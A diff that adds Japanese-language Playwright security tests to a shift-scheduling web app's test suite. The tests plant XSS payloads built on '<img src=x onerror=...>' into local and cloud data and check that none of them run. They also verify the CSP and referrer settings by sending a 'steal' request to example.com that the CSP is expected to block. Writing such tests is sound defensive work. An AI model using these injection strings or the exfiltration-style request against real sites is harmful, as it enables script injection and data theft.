@@ -474,6 +474,68 @@ const ok = (name, cond, extra) => {
   ok('同期のテスト中にエラーがない', A.errs.length === 0 && B.errs.length === 0, [A.errs, B.errs]);
   for (const c of devices) await c.close();
 
+  // ---- 安全性: 保存データが書き換えられていても、画面にスクリプトを埋め込まれない ----
+  const evil = (n) => `"><img src=x onerror="window.__pwned=${n}">`;
+  const evilState = () => {
+    const key = new Date().getFullYear() + '-' + String(new Date().getMonth() + 1).padStart(2, '0');
+    return {
+      staff: [
+        { id: evil(1), name: `<img src=x onerror="window.__pwned=2">`, points: '1' + evil(3), prevStreak: '2' + evil(4) },
+        { id: 'ok1', name: '正常な人', points: 3, prevStreak: 0 },
+      ],
+      needWeekday: '7' + evil(5),
+      needHigh: '9' + evil(6),
+      maxRun: 0,
+      months: { [key]: { off: { ok1: { 2: 1 } }, shifts: null, dayType: { 3: 'high' + evil(7) }, needOv: { 1: '5' + evil(8), 2: 4 } } },
+    };
+  };
+  const noInjection = async (p) => (await p.evaluate(() => window.__pwned === undefined)) && (await p.$$eval('img', (e) => e.length)) === 0;
+  {
+    // この端末に保存されているデータ
+    const c = await browser.newContext({ viewport: { width: 1100, height: 900 } });
+    await c.addInitScript((st) => { window.SHIFT_SYNC = { apiKey: '', projectId: '' }; localStorage.setItem('shift-work-v1', JSON.stringify(st)); }, evilState());
+    const p = await c.newPage();
+    const e = [];
+    p.on('pageerror', (x) => e.push(String(x)));
+    await p.goto(url);
+    await p.waitForSelector('#grid table');
+    await new Promise((r) => setTimeout(r, 800));
+    ok('この端末の保存データが書き換えられていても、スクリプトは実行されない', await noInjection(p), await p.evaluate(() => ({ pwned: window.__pwned, imgs: document.querySelectorAll('img').length })));
+    ok('書き換えられたデータでも、画面は動く（正常な人が表示される）', /正常な人/.test(await p.textContent('#grid')), e);
+    await c.close();
+    // クラウドから読み込んだデータ
+    fb.doc = JSON.stringify(evilState());
+    fb.updateTime = '2026-10-28T01:00:00Z';
+    const E = await openDevice();
+    await login(E.pg);
+    await E.pg.waitForFunction(() => /同期済み/.test(document.getElementById('syncStat').textContent), null, { timeout: 8000 });
+    await new Promise((r) => setTimeout(r, 800));
+    ok('クラウドのデータが書き換えられていても、スクリプトは実行されない', await noInjection(E.pg), await E.pg.evaluate(() => ({ pwned: window.__pwned, imgs: document.querySelectorAll('img').length })));
+    await E.ctx.close();
+  }
+
+  // ---- 安全性: 通信先の制限（CSP）と参照元の非送信 ----
+  {
+    const c = await browser.newContext({ viewport: { width: 1100, height: 900 } });
+    await c.addInitScript(() => { window.SHIFT_SYNC = { apiKey: '', projectId: '' }; });
+    const p = await c.newPage();
+    const msgs = [];
+    p.on('console', (m) => msgs.push(m.text()));
+    await p.goto(url);
+    await p.waitForSelector('#grid table');
+    const csp = await p.$eval('meta[http-equiv="Content-Security-Policy"]', (e) => e.content).catch(() => '');
+    ok('通信先を制限するCSPが設定されている', /default-src 'none'/.test(csp) && /connect-src https:\/\/identitytoolkit\.googleapis\.com https:\/\/securetoken\.googleapis\.com https:\/\/firestore\.googleapis\.com/.test(csp) && !/\*/.test(csp), csp);
+    if (/dist/.test(target)) ok('配布用のCSPは、外部ファイルの読み込みを一切許さない', !/'self'/.test(csp) && !/https?:\/\/(?!identitytoolkit|securetoken|firestore)/.test(csp), csp);
+    ok('参照元を送らない設定になっている', (await p.$eval('meta[name="referrer"]', (e) => e.content).catch(() => '')) === 'no-referrer');
+    await p.evaluate(() => fetch('https://example.com/steal?x=1').catch(() => {}));
+    await p.evaluate(() => { const i = new Image(); i.src = 'https://example.com/x.png'; });
+    await new Promise((r) => setTimeout(r, 500));
+    ok('許可していない外部への通信は、ブラウザに止められる', msgs.some((m) => /Content Security Policy/i.test(m) && /example\.com/.test(m)), msgs.slice(-3));
+    const dl = await Promise.all([p.waitForEvent('download'), p.click('#excelBtn')]);
+    ok('CSPがあってもExcelをダウンロードできる', /\.xlsx$/.test(dl[0].suggestedFilename()));
+    await c.close();
+  }
+
   await browser.close();
   console.log(failed ? `\n${failed} 件失敗` : '\nすべて成功');
   process.exit(failed ? 1 : 0);
